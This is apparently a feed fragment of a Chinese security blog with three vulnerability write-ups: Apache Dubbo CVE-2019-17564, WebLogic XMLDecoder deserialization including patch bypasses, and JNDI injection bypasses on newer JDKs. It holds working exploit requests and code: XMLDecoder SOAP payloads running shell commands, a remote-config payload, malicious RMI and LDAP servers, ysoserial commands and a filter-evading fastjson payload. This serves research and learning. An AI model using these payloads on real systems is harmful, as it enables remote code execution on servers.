PHP 运行时漏洞检测 毕业设计之php RASP taint: Taint is a PHP extension, used for detecting XSS codes]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-17564：Apache Dubbo反序列化漏洞分析]]></title>
    <url>%2F2020%2F02%2F14%2FCVE-2019-17564%EF%BC%9AApache%20Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[前几天360发了一则Apache Dubbo的漏洞预警，@hu3sky师傅让我帮他看看这个漏洞复现的问题。Burp打二进制的反序列化数据有一点bug，这里记录一下解决的过程。 环境搭建12git clone https://github.com/apache/dubbo-samples.gitcd dubbo-samples/java/dubbo-samples-http 修改/dubbo-samples/java/dubbo-samples-http/pom.xml123456&lt;properties&gt; &lt;source.level&gt;1.8&lt;/source.level&gt; &lt;target.level&gt;1.8&lt;/target.level&gt; &lt;!--修改版本为2.7.3--&gt; &lt;dubbo.version&gt;2.7.3&lt;/dubbo.version&gt; ... 再加一个dependency，作为gadget：123456&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2&lt;/version&gt;&lt;/dependency&gt; 然后 mvn clean package接着 mvn -Djava.net.preferIPv4Stack=true -Dexec.mainClass=org.apache.dubbo.samples.http.HttpProvider exec:java 或者扔进idea里，配一个-Djava.net.preferIPv4Stack=true参数 还要配一个zookeeper：zookeeper-3.4.14.ta 执行bin/zkServer.sh，如果提示no such file zoo.cfg，在conf目录下把zoo-sample.cfg改成zoo.cfg，然后继续执行即可。 漏洞复现踩了一堆坑，yso生成的反序列化数据，直接贴进burp是有蜜汁bug的，最后的解决办法有两种： 在Repeat里用Paste from file (@hu3sky师傅成功了，我没成功) 最后翻awesome-burp-extensions找到了Java-Deserialization-Scanner这个burp插件解决的，安利一波： 漏洞分析在dispatch文件处理http路由分发，/org/apache/dubbo/remoting/http/servlet/DispatcherServlet.java 跟进handle函数：/org/apache/dubbo/rpc/protocol/http/HttpProtocol.java判断是否为post请求，然后继续处理Request：/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.class将request的post输入传入： 最后在/org/springframework/remoting/rmi/RemoteInvocationSerializingExporter.class， 调用readObject() 调用栈： 最后一个sample环境的反序列化，要结合其他组件才能利用，个人感觉危害面不是很大。新版的修复策略，在处理路由的handle函数，使用了另外一个组件，且在处理非json数据的时候会抛出异常。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WebLogic-XMLDecoder反序列化分析]]></title>
    <url>%2F2020%2F02%2F11%2FWebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[基础关于java反序列化，可以参考这篇文章，写的很详细深入@gyyyy《浅析Java序列化和反序列化》。XMLDecoder是java中的一个类，不是Weblogic特有的，在这个位置java.beans.XMLDecoder，个人理解和传统反序列化类似，只是载体是通过XML来描述序列化数据。 下面来看一个解析xml导致反序列化命令执行的demo:1234567891011121314import java.beans.XMLDecoder;import java.io.BufferedInputStream;import java.io.FileInputStream;import java.io.FileNotFoundException;public class test &#123; public static void main(String[] args) throws FileNotFoundException &#123; XMLDecoder d = new XMLDecoder( new BufferedInputStream( new FileInputStream("/Users/passer6y/Documents/Code/java/weblogic/test.xml"))); Object result = d.readObject(); d.close(); &#125;&#125; test.xml123456789101112131415&lt;java version="1.4.0" class="java.beans.XMLDecoder"&gt; &lt;void class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;open -a Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt;&lt;/void&gt;&lt;/java&gt; 运行后可以发现，XML转换过来的java代码即12345import java.lang.ProcessBuilder;import java.lang.String;String[] cmdList = &#123;"/bin/bash", "-c", "open -a Calculator"&#125;;new ProcessBuilder(cmdList).start(); 关于XMLDecoder解析流程可以看这篇文章：XMLDecoder解析流程分析 环境搭建vulhub环境：https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271 这里需要远程调试，修改配置：docker-compose.yml1234567version: '2'services: weblogic: image: vulhub/weblogic ports: - "7001:7001" - "8453:8453" 执行docker-compose up -d，拉起容器后，进入容器，修改配置：/root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh，添加debug配置：12debugFlag=&quot;true&quot;export debugFlag 重启容器，再进入容器查看端口： 拷贝源码：12docker cp 0e1ef58d4a70:/root/Oracle/Middleware/wlserver_10.3 ./docker cp 0e1ef58d4a70:/root/Oracle/Middleware/modules ./ 折腾好之后，下好断点，浏览器触发请求，结果巨慢，加载了很久。 索性在本地装一个，官网下载安装的jar包，使用这个命令安装java -Dspace.detection=false -jar wls1036_generic.jar(不加-Dspace.detection=false参数会爆空间不足) 安装过程教程：https://blog.csdn.net/weixin_40102675/article/details/88180647 装好后启动weblogic12cd ~/Oracle/Middleware/user_projects/domains/base_domain/bin./startWeblogic.sh 去https://127.0.0.1:7001/console，输入密码weblogic weblogic@123 其他debug配置和上述一样。 漏洞复现EXP:123456789101112131415161718192021222324252627282930313233POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 127.0.0.1:7001Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.95 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7Cookie: PHPSESSID=mgr2tl959j6r7qbi9dadh0tsv5Connection: closeContent-Type: text/xmlContent-Length: 599&lt;soapenv:Envelope xmlns:soapenv=&quot;https://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;https://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;open -a Calculator&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 漏洞分析从poc的路由来看，wls-wsat这个接口出了问题，找到该war包的web.xml配置，定位到其对应的Servlet：weblogic.wsee.wstx.wsat.v10.endpoint.CoordinatorPortTypePortImpl 这个即为漏洞作用的接口，先从exp的响应包返回的调用栈来跟一下processRequest： weblogic.wsee.jaxws.workcontext.WorkContextServerTube#processRequestvar1即我们传入的XML，var3为soap标签解析结果，跟进weblogic.wsee.jaxws.workcontext.WorkContextTube#readHeaderOldvar4为poc关键部分，跟进receive函数，/weblogic/wsee/jaxws/workcontext/WorkContextServerTube.class#receive 一直往下跟：-&gt; /weblogic/workarea/WorkContextLocalMap.class#receiveRequest-&gt; /weblogic/workarea/spi/WorkContextEntryImpl.class#readEntry-&gt; /weblogic/wsee/workarea/WorkContextXmlInputAdapter.class#readUTF调用了xmlDecoder的readObject函数进行反序列化操作，最终造成命令执行。 调用栈： 补丁weblogic补丁只给付费用户发，我也就只能康康别人文章里的补丁来分析了。 这里补丁在WorkContextXmlInputAdapter中添加了validate验证，限制了Object标签，从而限制通过XML来构造类。12345678910111213141516171819private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid context type: object"); &#125; &#125; &#125;); &#125; catch (ParserConfigurationException var5) &#123; throw new IllegalStateException("Parser Exception", var5); &#125; catch (SAXException var6) &#123; throw new IllegalStateException("Parser Exception", var6); &#125; catch (IOException var7) &#123; throw new IllegalStateException("Parser Exception", var7); &#125; &#125; 这个版本对应的poc:1234567891011121314151617181920212223&lt;soapenv:Envelope xmlns:soapenv="https://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work="https://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;open -a Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt; &lt;/object&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 也正是因为这样的黑名单限制，所以很快就出了CVE-2017-10271。 CVE-2017-10271这个版本对应的poc，即和上边的区别即将object修改成void，就轻松绕过了补丁：1234567891011121314151617181920212223&lt;soapenv:Envelope xmlns:soapenv="https://schemas.xmlsoap.org/soap/envelope/"&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work="https://bea.com/2004/06/soap/workarea/"&gt; &lt;java&gt; &lt;void class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="3"&gt; &lt;void index="0"&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;/void&gt; &lt;void index="1"&gt; &lt;string&gt;-c&lt;/string&gt; &lt;/void&gt; &lt;void index="2"&gt; &lt;string&gt;open -a Calculator&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start"/&gt; &lt;/void&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt; &lt;/soapenv:Envelope&gt; 简单看了一些XMLDecoder解析流程分析文章中的分析，VoidElementHandler类继承的ObjectElementsHandler类，只改写了isArgument函数，而在整个触发过程中并无影响，所以此处使用void标签与object标签没有区别。 而补丁的形式依然是黑名单限制标签的形式：1234567891011121314151617181920212223242526private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase("object")) &#123; throw new IllegalStateException("Invalid element qName:object"); &#125; else if(qName.equalsIgnoreCase("new")) &#123; throw new IllegalStateException("Invalid element qName:new"); &#125; else if(qName.equalsIgnoreCase("method")) &#123; throw new IllegalStateException("Invalid element qName:method"); &#125; else &#123; if(qName.equalsIgnoreCase("void")) &#123; for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) &#123; if(!"index".equalsIgnoreCase(attributes.getQName(attClass))) &#123; throw new IllegalStateException("Invalid attribute for element void:" + attributes.getQName(attClass)); &#125; &#125; &#125; if(qName.equalsIgnoreCase("array")) &#123; String var9 = attributes.getValue("class"); if(var9 != null &amp;&amp; !var9.equalsIgnoreCase("byte")) &#123; throw new IllegalStateException("The value of class attribute is not valid for array element."); &#125; CVE-2019-2725时隔两年：123456789101112131415161718192021222324252627282930POST /_async/AsyncResponseService HTTP/1.1Host: localhost:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/xmlContent-Length: 728Cookie: remember-me=MXPUSANQRVaBJYtUucUgmQ==Connection: closeUpgrade-Insecure-Requests: 1&lt;soapenv:Envelope xmlns:soapenv=&quot;https://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;https://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;https://www.bea.com/async/AsyncResponseService&quot;&gt; &lt;soapenv:Header&gt; &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt; &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt; &lt;work:WorkContext xmlns:work=&quot;https://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt; &lt;class&gt; &lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt; &lt;void&gt; &lt;string&gt;https://xxxx&lt;/string&gt; &lt;/void&gt; &lt;/class&gt; &lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body&gt; &lt;asy:onAsyncDelivery/&gt; &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 使用class标签构造类，但是由于限制了method函数，无法进行函数调用，只能从构造方法下手，且参数为基本类型： 构造函数有写文件操作，文件名和内容可控，可以进行getshell。 构造函数有其他的反序列化操作，我们可以进行二次反序列化操作。 构造函数直接有执行命令的操作，执行命令可控。 有其它的可能导致rce的操作，比如表达式注入之类的。 网上通用的有： FileSystemXmlApplicationContext UnitOfWorkChangeSet 这次的修复最终将class标签给禁用了。 cve-2019-2729https://xz.aliyun.com/t/7116jdk1.7比jdk1.6多了几个标签property和field标签。通过调用静态属性的get、set方法来触发。 最后能力有限，从搭建到复现分析花了不少时间，在过程中也学习收获不少。最后感谢@hu3sky师傅的帮助，以及下面这些师傅的文章分享。 参考文章： @whip1ash CVE-2017-3506 &amp; CVE-2017-10271 - 从0开始学习Java反序列化 (1) @gyyyy《浅析Java序列化和反序列化》 WebLogic 动态调试环境搭建 XMLDecoder解析流程分析 @kingkk Weblogic-XMLDecoder反序列化学习]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JNDI注入高版本jdk绕过学习]]></title>
    <url>%2F2020%2F02%2F04%2FJNDI%E6%B3%A8%E5%85%A5%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[在之前的复现分析过程中用到的jdk版本都是较低的版本，这篇文章主要研究不同jdk版本对JNDI注入不同姿势的影响，以及绕过姿势。关于JNDI注入和RMI的基础知识可以参考这两篇文章学习： curz0n: CVE-2019-14540远程代码执行漏洞分析&amp;复现 kingx: 深入理解JNDI注入与Java反序列化漏洞利用 RMI Remote Object Payload (限制较多，不常使用)RMI + JNDI Reference Payload这个方法就是我们常用的加载远程class进行JNDI注入的操作，攻击者通过RMI服务返回一个JNDI Naming Reference，受害者解码Reference时会去我们指定的Codebase远程地址加载Factory类，但是原理上并非使用RMI Class Loading机制的，因此不受 java.rmi.server.useCodebaseOnly系统属性的限制，相对来说更加通用。 但是在JDK 6u132,JDK 7u122,JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。如果需要开启RMI Registry或者COS Naming Service Provider的远程类加载功能，需要将前面说的两个属性值设置为true。 Changelog: JDK 6u141 https://www.oracle.com/technetwork/java/javase/overview-156328.html#R160_141 JDK 7u131 https://www.oracle.com/technetwork/java/javase/7u131-relnotes-3338543.html JDK 8u121 https://www.oracle.com/technetwork/java/javase/8u121-relnotes-3315208.html 案例参考笔记：深入理解RMI&amp;JRMP&amp;JNDI 触发过程分析低版本8u73测试产生JNDI注入的原因是客户端lookup方法可控，我们先在Registry中注册恶意的Reference对象，加载远程类对象。 将Registry的url地址传入InitialContext.lookup(URL)方法中，这里用低版本8u73下断点调试:/com/sun/jndi/toolkit/url/GenericURLContext.class解析URL，将Exploit类传入，lookup方法调用decodeObject方法：/com/sun/jndi/rmi/registry/RegistryContext.class又进入到NamingManager.getObjectInstance方法：在进入getObjectInstance方法后又在319行调用getObjectFactoryFromReference方法，先从本地的类加载器去classpath加载目标类，如果没有，则调用loadClass(factoryName, codebase)去远程加载我们构造的特定类，并将其实例化： 整个利用流程： 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server/classname； 击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果； 高版本8u201测试再来看看高版本8u201，在RegistryContext.class#decodeObject函数中，增加了trustURLCodebase的判断，且默认为false。 多个判断是逻辑与的关系，有一个不成立则可通过，这里可以利用var8.getFactoryClassLocation()为null进入NamingManager.getObjectInstance函数：接着进入getObjectFactoryFromReference函数，但是在加载远程类之前又进行了一次null判断，加载远程类： 所以这里的利用条件就变成了只能用helper.loadClass(factoryName)加载目标机器中classpath中的类。从下图NamingManager.java的代码中可以知道，该类要实现 javax.naming.spi.ObjectFactory接口，且存在getObjectInstance方法： 总结一下高版本利用条件即： 利用目标机器classpath类 实现了javax.naming.spi.ObjectFactory接口 存在getObjectInstance方法 在下文中会介绍详细案例利用细节。 LDAP + JNDI Reference Payload除了RMI服务之外，JNDI还可以对接LDAP服务，LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。并且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。 案例参考笔记：深入理解RMI&amp;JRMP&amp;JNDI 这里为了探究具体的修改点，跟进了8u181和8u201两个版本的ldap加载流程，解析codebase的流程不受com.sun.jndi.rmi.object.trustURLCodebase`com.sun.jndi.cosnaming.object.trustURLCodebase属性影响，但在最后加载远程class的函数helper.loadClass(factoryName, codebase)高版本8u201条件添加了trustURLCodebase`(默认为false)的校验，如下图所示： 绕过JDK 8u191+等高版本限制所以对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认环境下之前这些利用方式都已经失效。然而，我们依然可以进行绕过并完成利用。两种绕过方法如下： 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。 利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。 JRMP：空指针-treasure-Writeup这三种方式都依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。 利用本地Class作为Reference Factory绕过高版本限制在上文中RMI + JNDI Reference Payload部分我们已经介绍了在高版本修复策略，以及绕过的利用条件。在org.apache.naming.factory.BeanFactory中刚好满足条件并且存在被利用的可能，该接口存在于Tomcat依赖包中，使用也是非常广泛。 环境搭建之前用pom.xml拉tomcat的包复现蜜汁原因失败，后来用的MxSrvs里自带的tomcat依赖复现成功了。为了便于分析去导个源码，找到对应的版本，点下图所示的View All然后去idea里导入就行了 漏洞复现poc:Server.java123456789101112131415161718import com.sun.jndi.rmi.registry.ReferenceWrapper;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.StringRefAddr;import org.apache.naming.ResourceRef;public class Server &#123; public static void main(String[] args) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null); resourceRef.add(new StringRefAddr("forceString", "a=eval")); resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"open /Applications/Calculator.app/\")")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(resourceRef); registry.bind("EvalObj", referenceWrapper); System.out.println("the Server is bind rmi://127.0.0.1:1098/EvalObj"); &#125;&#125; Client.java123456789import javax.naming.*;public class Client &#123; public static void main(String[] args) throws Exception &#123; String uri = "rmi://127.0.0.1:1099/EvalObj"; Context ctx = new InitialContext(); ctx.lookup(uri); // 返回加载的远程对象 &#125;&#125; 漏洞分析/org/apache/naming/factory/BeanFactory.java 这个类满足上述提到的高版本利用的两个条件：BeanFactory.java#getObjectInstance，从上文RMI + JNDI注入的触发流程分析中可以知道，可控参数为obj和name。这里限制了传入的对象必须为ResourceRef类，通过反射调用在148行实例化了一个无参对象，意味着beanClass得有一个无参构造函数： 接着取出key为forceString的值进行以,分割，拆分=键值对，存入hashMap对象中： 其后通过反射执行我们指定的之前构造的方法，并可以传入一个字符串类型的参数： 到这里利用过程就结束了，再来跟一下利用限制如何满足，第一个条件是传入的对象必须是属于ResourceRef类，接着调用了ref.getClassName()获取beanClassName，也就是目标类： 跟进ResourceRef类，该类也是Reference的子类，在实例化的时候，可以通过构造方法传入目标class：通过调用父类的构造方法实现成员变量className的赋值 再来BeanFactory.java看一下ref.get(&quot;forceString&quot;)是如何实现的，我们要如果构造poc控制forceString参数，同样的也是在Reference.java中通过遍历成员变量addrs数组来进行寻找： 在Reference.java中找到控制addrs元素的办法：要求我们传入一个RefAddr类型的addr，在其子类有一个StringRefAddr函数：所以可以通过这样的方式来设置属性：1new ResourceRef().add(new StringRefAddr("forceString", "xxx")) 在veracode博客中构造的beanClass是javax.el.ELProcessor，ELProcessor中有个eval(String)方法可以执行EL表达式，javax.el.ELProcessor是Tomcat8中的库，所以仅限Tomcat8及更高版本环境下可以通过该库进行攻击。 翻了一些资料还有一些其他的类符合条件可以作为beanClass注入到BeanFactory中实现利用，比如Orange师傅的Jenkins漏洞实现利用，先挖个坑。 利用LDAP返回序列化数据，触发本地Gadget绕过高版本限制目录是一种分布式数据库，目录服务是由目录数据库和一套访问协议组成的系统。LDAP全称是轻量级目录访问协议（The Lightweight Directory Access Protocol），它提供了一种查询、浏览、搜索和修改互联网目录数据的机制，运行在TCP/IP协议栈之上，基于C/S架构。除了RMI服务之外，JNDI也可以与LDAP目录服务进行交互，Java对象在LDAP目录中也有多种存储形式： Java序列化 JNDI Reference Marshalled对象 Remote Location (已弃用)LDAP可以为存储的Java对象指定多种属性： javaCodeBase objectClass javaFactory javaSerializedData 这里 javaCodebase 属性可以指定远程的URL，这样黑客可以控制反序列化中的class，通过JNDI Reference的方式进行利用。但是高版本JVM对Reference Factory远程加载类进行了安全限制，JVM不会信任LDAP对象反序列化过程中加载的远程类。 此时，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。 假设客户端存在有漏洞的Apache-Commons-Collections-3.1，ldap服务端返回一个ysoserial生成的Exp：1java -jar ysoserial.jar CommonsCollections6 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos;|base64 ldap服务端代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import com.unboundid.util.Base64;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL;import java.text.ParseException;public class LdapServer &#123; private static final String LDAP_BASE = "dc=example,dc=com"; public static void main (String[] args) &#123; String url = "https://127.0.0.1:80/#Exploit"; int port = 1389; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( "listen", InetAddress.getByName("0.0.0.0"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println("Listening on 0.0.0.0:" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class")); System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl); e.addAttribute("javaClassName", "Exploit"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; // Payload1: Return Evil Reference Factory// e.addAttribute("javaCodeBase", cbstring);// e.addAttribute("objectClass", "javaNamingReference");// e.addAttribute("javaFactory", this.codebase.getRef()); //Payload2: Return Evil Serialized Gadget try &#123; // java -jar ysoserial.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64 e.addAttribute("javaSerializedData", Base64.decode("rO0ABXNyABFqYX...")); &#125; catch (ParseException e1) &#123; e1.printStackTrace(); &#125; result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; jdk8u201测试结果： 这种绕过方式需要利用一个本地的反序列化利用链，来结合JNDI注入的入口来利用。 利用JRMP触发本地gadgetJRMP(Java Remote Method Protocol)，Java远程方法协议，类比于HTTP协议是基于TCP/IP协议，RMI即基于JRMP协议。JRMP规定了RMI通信过程的数据格式等。 以空指针公开赛CTF-treasure这题为例，题目源码：treasure高版本jdk8u201(默认不开远程类加载)，fastjson1.2.61，标准的解析json：me/firesun/treasure/controller/SubmitController.javaSubmitController.java中开启了autotype： 中间件中LogAspect.java检测type关键字，这里用\x16进制编码绕就行了，在之前的文章Fastjson 反序列化触发流程分析中有分析。 接着就是寻找JNDI注入点，全局搜lookup(： 还是有点问题，搜不了class文件，可以mvn拉下源码全局搜/org/apache/commons/proxy/provider/remoting/RmiProvider.class中有一处lookup函数调用：参数name利用fastjson解析json数据自动调用setXX方法设置：再看看reg变量: RmiProvider.class#getRegistry，也就是rmi的客户端实现 123456789101112public class RmiProvider implements ObjectProvider &#123; private String host = "localhost"; private int port = 1099; //... private Registry getRegistry() &#123; try &#123; return this.clientSocketFactory != null ? LocateRegistry.getRegistry(this.host, this.port, this.clientSocketFactory) : LocateRegistry.getRegistry(this.host, this.port); &#125; catch (RemoteException var2) &#123; throw new ObjectProviderException("Unable to locate registry at " + this.host + ":" + this.port + ".", var2); &#125; &#125; //... 构造一个JRMP Server，利用RMI触发，在依赖库里引用了commons-collections3.2,使用ysoserial的commonscollections5：1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 &apos;/Applications/Calculator.app/Contents/MacOS/Calculator&apos; submit路由发送：1&#123;&quot;@\u0074ype&quot;:&quot;org.apache.commons.proxy.provider.remoting.RmiProvider&quot;,&quot;host&quot;:&quot;127.0.0.1&quot;,&quot;port&quot;:&quot;1088&quot;,&quot;name&quot;:&quot;Object&quot;&#125; 同样也要求classpath中的类有反序列化漏洞，借助Registry的入口实现命令执行。 小结文章研究了多个jdk版本的多种jndi注入方式，以及高版本利用限制分析和绕过方式，收获颇为丰富。 参考文章： kingx: 深入理解JNDI注入与Java反序列化漏洞利用 kingx: 如何绕过高版本JDK的限制进行JNDI注入利用 Exploiting JNDI Injections in Java Welkin: 浅析JNDI注入Bypass]]></content>
      <categories>
        <category>Web</category>
